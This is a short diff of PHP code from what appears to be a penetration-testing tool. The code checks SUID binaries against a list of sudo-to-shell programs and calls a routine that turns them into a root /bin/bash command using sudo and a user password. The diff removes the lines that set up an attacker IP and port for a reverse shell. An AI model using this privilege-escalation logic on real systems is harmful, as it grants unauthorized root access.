@@ -880,15 +880,11 @@ This can be used to help determine the OS running and the last time it's been fu
            
             if (in_array($obj_suid->file_name, $this->tab_sudo8app2shell) ) {
                 $cmd_id = "%ID%";
-                $attacker_ip = $this->ip4addr4target($this->ip);
-                $attacker_port = rand(1024,65535);
-                //$attacker_port = 7777;
-                $shell = "/bin/bash";
-                $id = $obj_suid->elf4root2cmd($this->ip,$attacker_port,$shell,$sudo,$userpass, $cmd_id);
+                $id = $obj_suid->elf4root2cmd($this->ip,"","/bin/bash",$sudo,$userpass, $cmd_id);
                 $this->pause();
                 $template_id_test = str_replace("%ID%", $id, $this->template_id);
                 
-                $this->lan2pentest8id($template_id_test,$attacker_ip,$attacker_port,$shell);$this->pause();
+                $this->lan2pentest8id($template_id_test);$this->pause();
             }
    }
  
